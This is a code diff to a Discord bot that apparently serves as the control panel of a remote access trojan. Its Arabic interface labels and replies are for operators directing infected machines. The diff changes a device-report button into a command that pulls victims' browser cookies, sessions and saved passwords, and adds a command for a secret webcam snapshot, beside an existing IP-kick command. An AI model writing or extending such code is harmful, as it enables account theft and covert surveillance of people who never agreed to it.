@@ -1,3 +1,6 @@
+Python
+
+
 import os
 import base64
 import json
@@ -299,17 +302,27 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Kick {self.ip}"):
                 await interaction.followup.send(f"👢 تم إرسال أمر الطرد للـ IP: `{self.ip}`!", ephemeral=True)
 
-    @discord.ui.button(label="📁 سحب تقرير الجهاز (TXT)", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=1)
+    @discord.ui.button(label="📁 سحب كوكيز وكلمات المرور (أمر 1)", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=1)
     async def export_client_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_exports" not in db: db["remote_exports"] = {}
             db["remote_exports"][self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Export telemetry for {self.code}"):
-                await interaction.followup.send("📁 تم طلب ملف التقرير ومعلومات الجهاز، سيصلك هنا قريباً!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Export browser data for {self.code}"):
+                await interaction.followup.send("📁 [أمر 1] تم طلب سحب جلسات وكريديتس المتصفحات، سيصلك التقرير هنا قريباً!", ephemeral=True)
 
-    @discord.ui.button(label="📸 سحب تقرير الملفات والصور", style=discord.ButtonStyle.secondary, custom_id="dev_act_files_report", row=1)
+    @discord.ui.button(label="📸 التقاط صورة كاميرا سرية (أمر 4)", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
+    async def webcam_snapshot_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_webcams" not in db: db["remote_webcams"] = {}
+            db["remote_webcams"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Request webcam snapshot for {self.code}"):
+                await interaction.followup.send("📸 [أمر 4] تم طلب التقاط صورة الكاميرا السرية للعميل، ستصلك الصورة هنا خلال لحظات!", ephemeral=True)
+
+    @discord.ui.button(label="📸 سحب تقرير الملفات والصور", style=discord.ButtonStyle.secondary, custom_id="dev_act_files_report", row=2)
     async def files_report_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
